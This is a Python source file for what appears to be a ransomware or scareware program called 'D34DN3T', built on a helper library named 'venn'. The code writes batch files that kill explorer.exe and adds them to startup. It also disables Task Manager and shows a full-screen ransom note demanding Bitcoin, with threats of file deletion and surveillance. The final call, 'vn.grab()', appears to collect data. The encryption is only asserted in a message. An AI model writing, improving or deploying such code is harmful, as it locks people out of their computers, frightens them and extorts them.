import venn as vn
import time
import os
#CODE

class FirstStep:
    vn.createf(createfile="SYSTEM32.bat",writetofile="taskkill /f /im explorer.exe")

class SecondStep:
    vn.add_to_startup(file="SYSTEM32.bat")

class ChangeBackground:
    vn.change_desktop_background()

class MAKE_LOOP_KILL_EXPL:
    BTCADDRESS = "abcdefghijklabcdefghijklmnoprsqtzyvx20mnoprsqtzyvx20"
    TEXT_ONE = f"""Hello, you got infected by a ransomware called D34DN3T. At this point, your files are encrypted and
no one can help you. Only thing you can do is to pay via Bitcoins. Price of decryption is 20€.
If you do not know how to pay check some tutorials on google or youtube. Do not try to
remove or delete this ransomware, but if you do, then everything in your PC will be deleted,
within a seconds. I can see your screen and I see what you are doing on your PC, so dont be silly.
Lets hop into it.
Bitcoin Address is -> {BTCADDRESS}"""
    vn.createf(createfile="WIN32API.bat",writetofile="taskkill /f /im explorer.exe")
    vn.createf(createfile="32API.txt",writetofile=TEXT_ONE)

class AddToStartup:
    vn.add_to_startup(file="WIN32API.bat")
    vn.add_to_startup(file="32API.txt")
    time.sleep(3)

class DeletingFiles:
    path = os.getcwd()
    vn.delete(deletefile=f"{path}/WIN32API.bat")
    vn.delete(deletefile=f"{path}/32API.txt")
    vn.delete(deletefile=f"{path}/SYSTEM32.bat")


class DisableTaskManager:
    vn.disabletaskmanager()

class TaskKill:
    vn.taskkillexplorer()

class PopUpGUI:
    TITLEMSG = "!!! D34DN3T RANSOMWARE !!!"
    BTCADDRESS = "abcdefghijklabcdefghijklmnoprsqtzyvx20mnoprsqtzyvx20"
    MSG = f"""    
    Hello, you got infected by a ransomware called D34DN3T. At this point, your files are encrypted and
    no one can help you. Only thing you can do is to pay via Bitcoins. Price of decryption is 20€.
    If you do not know how to pay check some tutorials on google or youtube. Do not try to
    remove or delete this ransomware, but if you do, then everything in your PC will be deleted,
    within a seconds. I can see your screen and I see what you are doing on your PC, so dont be silly.
    Lets hop into it.
    Bitcoin Address is -> {BTCADDRESS}
    Press ESC to QUIT..
"""
    vn.creategui(boxgeometry="1920x1080",textbox_height=30,textbox_width=90,bgcolor="#FF0000",
    message=MSG,title="VIRUS",textboxcolor="#161616",titlemessage=TITLEMSG)

class DeletingFilesAgain:
    CurrentPath = os.getcwd()
    vn.delete(deletefile=f"{CurrentPath}/WINSYSTEM32.bat")

class PlayVideo:
    vn.videoplay(path_to_video="video/trim.mp4")
    print("Wait for the output and more information..")

class ENCRYPTION:
    ENCRYPTED_MESSAGE = "!!! ALL FILES ENCRYPTED !!!"
    vn.encryption_text_gui(boxgeometry="0x0",title="ENCRYPTED",bgcolor="white",titlemessage=ENCRYPTED_MESSAGE,imagePath="images/closed.png")

class StartLogs:
    print("Wait for the output and more information..")
    vn.grab()